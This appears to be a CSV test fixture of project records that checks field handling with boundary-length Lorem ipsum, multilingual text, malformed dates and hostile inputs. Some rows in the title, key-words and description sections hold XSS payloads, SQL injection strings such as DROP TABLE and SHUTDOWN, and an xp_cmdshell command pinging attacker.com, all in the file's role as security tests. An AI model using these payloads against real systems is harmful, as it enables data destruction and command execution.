key,title,key-words,description,kick-off-moment,close-out-moment,draft-mode,key:manager
# base entity
project-01,example,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
# title
project-02,L,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-03,Lo,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-04,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod t",example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-05,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod te",example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-06,โลเร็ม อิปซัม,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-07,لوريم إيبسوم,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-08,洛伦·伊普森,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-09,<marquee>Hacked</marquee>,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-10,<script>alert(‘Hacked!’);</script>,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-11,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-12,' or 'A' = 'A,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-13,'; DROP TABLE user_account;--,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-14,'; SHUTDOWN;--,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-15,'; EXEC xp_cmdshell('ping attacker.com');--,example,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
# key-words,"","","","","","",""
project-16,example,L,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-17,example,Lo,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-18,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor",example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-19,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor*",example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-20,example,โลเร็ม อิปซัม,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-21,example,لوريم إيبسوم,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-22,example,洛伦·伊普森,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-23,example,<marquee>Hacked</marquee>,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-24,example,<script>alert(‘Hacked!’);</script>,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-25,example,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-26,example,' or 'A' = 'A,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-27,example,'; DROP TABLE user_account;--,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-28,example,'; SHUTDOWN;--,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-29,example,'; EXEC xp_cmdshell('ping attacker.com');--,example,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
# description,"","","","","","",""
project-30,example,example,L,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-31,example,example,Lo,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-32,example,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor",2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-33,example,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor*",2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-34,example,example,โลเร็ม อิปซัม,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-35,example,example,لوريم إيبسوم,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-36,example,example,洛伦·伊普森,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-37,example,example,<marquee>Hacked</marquee>,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-38,example,example,<script>alert(‘Hacked!’);</script>,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-39,example,example,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-40,example,example,' or 'A' = 'A' or 'A' = 'A,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-41,example,example,'; DROP TABLE user_account;--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-42,example,example,'; SHUTDOWN;--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
project-43,example,example,'; EXEC xp_cmdshell('ping attacker.com');--,2025/09/01 10:00,2025/09/01 12:00,true,manager-01
# moments,"","","","","","",""
project-44,example,example,example,2025/01/01 00:012025/01/01 00:01,2026/01/01 00:01,true,manager-01
project-45,example,example,example,2200/12/31 23:58,2200/12/31 23:59,true,manager-01
# draft-mode,"","","","","","",""
project-46,example,example,example,2025/09/01 10:00,2025/09/01 12:00,false,manager-01
